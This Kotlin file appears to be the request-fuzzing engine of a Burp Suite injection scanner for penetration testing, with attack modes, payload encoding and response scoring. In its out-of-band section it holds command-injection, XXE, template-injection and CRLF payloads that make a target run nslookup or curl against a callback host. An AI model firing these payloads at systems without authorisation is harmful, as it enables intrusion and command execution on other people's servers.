package com.burpinj.engine

import burp.api.montoya.MontoyaApi
import burp.api.montoya.collaborator.CollaboratorClient
import burp.api.montoya.http.message.requests.HttpRequest
import burp.api.montoya.http.message.responses.HttpResponse
import com.burpinj.detect.Scorer
import com.burpinj.detect.Signal
import com.burpinj.payloads.PayloadClass
import com.burpinj.payloads.PayloadSet
import java.net.URLEncoder
import java.util.Base64
import java.util.concurrent.atomic.AtomicInteger

data class ScanOptions(
    val contextPrune: Boolean = false,
    val urlEncode: Boolean = false,
    val doubleUrlEncode: Boolean = false,
    val base64Encode: Boolean = false,
    val collaboratorEnabled: Boolean = false
)

/** Everything a single result row knows. */
data class JobResult(
    val id: Int,
    val klass: PayloadClass,
    val positionLabels: List<String>,
    val payloads: List<String>,
    val request: HttpRequest,
    val response: HttpResponse?,
    val durationMs: Long,
    val signal: Signal,
    val confidence: Double,
    val error: String? = null
)

data class Baseline(
    val request: HttpRequest,
    val response: HttpResponse?,
    val durationMs: Long,
    val body: String,
    val status: Short
)

class JobRunner(
    private val api: MontoyaApi,
    private val scheduler: Scheduler,
    private val opts: ScanOptions = ScanOptions(),
    private val collab: CollaboratorClient? = null
) {
    private val counter = AtomicInteger(0)

    private fun expandEncoded(p: String): List<String> {
        val out = mutableListOf(p)
        if (opts.urlEncode) {
            try { out += URLEncoder.encode(p, "UTF-8") } catch (_: Throwable) {}
        }
        if (opts.doubleUrlEncode) {
            try {
                val once = URLEncoder.encode(p, "UTF-8")
                out += URLEncoder.encode(once, "UTF-8")
            } catch (_: Throwable) {}
        }
        if (opts.base64Encode) {
            try { out += Base64.getEncoder().encodeToString(p.toByteArray(Charsets.UTF_8)) } catch (_: Throwable) {}
        }
        return out.distinct()
    }

    private fun shouldSkipForContext(klass: PayloadClass, originalValue: String): Boolean {
        if (!opts.contextPrune) return false
        val v = originalValue.trim()
        if (v.isEmpty()) return false
        val numeric = v.matches(Regex("-?\\d+(\\.\\d+)?"))
        val pathLike = v.contains("/") || v.contains("\\") || v.endsWith(".php") || v.endsWith(".html") || v.endsWith(".jsp")
        return when (klass) {
            PayloadClass.XSS, PayloadClass.XXE, PayloadClass.PATH -> numeric
            PayloadClass.SQLI, PayloadClass.NOSQLI -> pathLike && !numeric
            else -> false
        }
    }

    private fun oobPayloadsFor(klass: PayloadClass): List<String> {
        val c = collab ?: return emptyList()
        if (!opts.collaboratorEnabled) return emptyList()
        val host = try { c.generatePayload().toString() } catch (_: Throwable) { return emptyList() }
        return when (klass) {
            PayloadClass.RCE -> listOf(
                ";nslookup $host;",
                "|nslookup $host|",
                "`curl http://$host/`",
                "\$(curl http://$host/)"
            )
            PayloadClass.XXE -> listOf(
                "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY % e SYSTEM \"http://$host/x.dtd\"> %e;]>"
            )
            PayloadClass.SSTI -> listOf(
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "\${T(java.lang.Runtime).getRuntime().exec('curl http://$host/')}"
            )
            PayloadClass.CRLF -> listOf(
                "%0d%0aLocation:%20http://$host/"
            )
            else -> emptyList()
        }
    }

    fun estimate(
        mode: AttackMode,
        positions: List<InsertionPoint>,
        sets: Map<PayloadClass, List<PayloadSet>>
    ): Int {
        var total = 0
        for ((_, lists) in sets) {
            total += when (mode) {
                AttackMode.SNIPER -> lists.sumOf { it.payloads.size } * positions.size
                AttackMode.BATTERING_RAM -> lists.sumOf { it.payloads.size }
                AttackMode.PITCHFORK -> {
                    val perPos = lists.firstOrNull()?.payloads?.size ?: 0
                    perPos
                }
                AttackMode.CLUSTER_BOMB -> {
                    val perPos = lists.firstOrNull()?.payloads?.size ?: 0
                    var p = 1
                    repeat(positions.size) { p *= perPos.coerceAtLeast(1) }
                    p
                }
            }
        }
        return total
    }

    fun sendBaseline(base: HttpRequest, cb: (Baseline) -> Unit) {
        scheduler.submit(base) { sent ->
            val body = sent.response?.body()?.toString() ?: ""
            val status = sent.response?.statusCode() ?: 0
            cb(Baseline(base, sent.response, sent.durationMs, body, status))
        }
    }

    fun run(
        base: HttpRequest,
        positions: List<InsertionPoint>,
        mode: AttackMode,
        sets: Map<PayloadClass, List<PayloadSet>>,
        baseline: Baseline,
        onRow: (JobResult) -> Unit
    ) {
        for ((klass, lists) in sets) {
            when (mode) {
                AttackMode.SNIPER -> runSniper(base, positions, klass, lists, baseline, onRow)
                AttackMode.BATTERING_RAM -> runBatteringRam(base, positions, klass, lists, baseline, onRow)
                AttackMode.PITCHFORK -> runPitchfork(base, positions, klass, lists, baseline, onRow)
                AttackMode.CLUSTER_BOMB -> runClusterBomb(base, positions, klass, lists, baseline, onRow)
            }
        }
    }

    private fun runSniper(
        base: HttpRequest,
        positions: List<InsertionPoint>,
        klass: PayloadClass,
        lists: List<PayloadSet>,
        baseline: Baseline,
        onRow: (JobResult) -> Unit
    ) {
        val basePayloads = lists.flatMap { it.payloads } + oobPayloadsFor(klass)
        for (pos in positions) {
            if (shouldSkipForContext(klass, pos.originalValue)) continue
            for (p in basePayloads) {
                for (enc in expandEncoded(p)) {
                    val allPayloads = positions.map { if (it === pos) enc else it.originalValue }
                    fire(base, positions, allPayloads, klass, listOf(pos.label), baseline, onRow)
                }
            }
        }
    }

    private fun runBatteringRam(
        base: HttpRequest,
        positions: List<InsertionPoint>,
        klass: PayloadClass,
        lists: List<PayloadSet>,
        baseline: Baseline,
        onRow: (JobResult) -> Unit
    ) {
        val payloads = (lists.flatMap { it.payloads } + oobPayloadsFor(klass))
            .flatMap { expandEncoded(it) }
        for (p in payloads) {
            val allPayloads = positions.map { p }
            fire(base, positions, allPayloads, klass, positions.map { it.label }, baseline, onRow)
        }
    }

    private fun runPitchfork(
        base: HttpRequest,
        positions: List<InsertionPoint>,
        klass: PayloadClass,
        lists: List<PayloadSet>,
        baseline: Baseline,
        onRow: (JobResult) -> Unit
    ) {
        val perPos = positions.map { pos ->
            val list = lists.getOrNull(positions.indexOf(pos))?.payloads ?: lists.firstOrNull()?.payloads ?: emptyList()
            list
        }
        val n = perPos.minOfOrNull { it.size } ?: 0
        for (i in 0 until n) {
            val allPayloads = perPos.map { it[i] }
            fire(base, positions, allPayloads, klass, positions.map { it.label }, baseline, onRow)
        }
    }

    private fun runClusterBomb(
        base: HttpRequest,
        positions: List<InsertionPoint>,
        klass: PayloadClass,
        lists: List<PayloadSet>,
        baseline: Baseline,
        onRow: (JobResult) -> Unit
    ) {
        val perPos = positions.mapIndexed { idx, _ ->
            lists.getOrNull(idx)?.payloads ?: lists.firstOrNull()?.payloads ?: emptyList()
        }
        if (perPos.any { it.isEmpty() }) return
        val indices = IntArray(perPos.size)
        while (true) {
            val allPayloads = indices.mapIndexed { i, v -> perPos[i][v] }
            fire(base, positions, allPayloads, klass, positions.map { it.label }, baseline, onRow)
            var carry = indices.size - 1
            while (carry >= 0) {
                indices[carry]++
                if (indices[carry] < perPos[carry].size) break
                indices[carry] = 0
                carry--
            }
            if (carry < 0) break
        }
    }

    private fun fire(
        base: HttpRequest,
        positions: List<InsertionPoint>,
        payloads: List<String>,
        klass: PayloadClass,
        labels: List<String>,
        baseline: Baseline,
        onRow: (JobResult) -> Unit
    ) {
        val req = Replayer.withPayloads(base, positions, payloads)
        val id = counter.incrementAndGet()
        scheduler.submit(req) { sent ->
            val body = sent.response?.body()?.toString() ?: ""
            val status = sent.response?.statusCode() ?: 0
            val signal = Scorer.analyse(
                klass,
                baseline.body, baseline.status, baseline.durationMs,
                body, status, sent.durationMs,
                payloads.firstOrNull { it != baseline.request.body().toString() } ?: payloads.first()
            )
            val confidence = Scorer.score(klass, signal)
            onRow(JobResult(
                id = id,
                klass = klass,
                positionLabels = labels,
                payloads = payloads,
                request = sent.request,
                response = sent.response,
                durationMs = sent.durationMs,
                signal = signal,
                confidence = confidence,
                error = sent.error
            ))
        }
    }
}
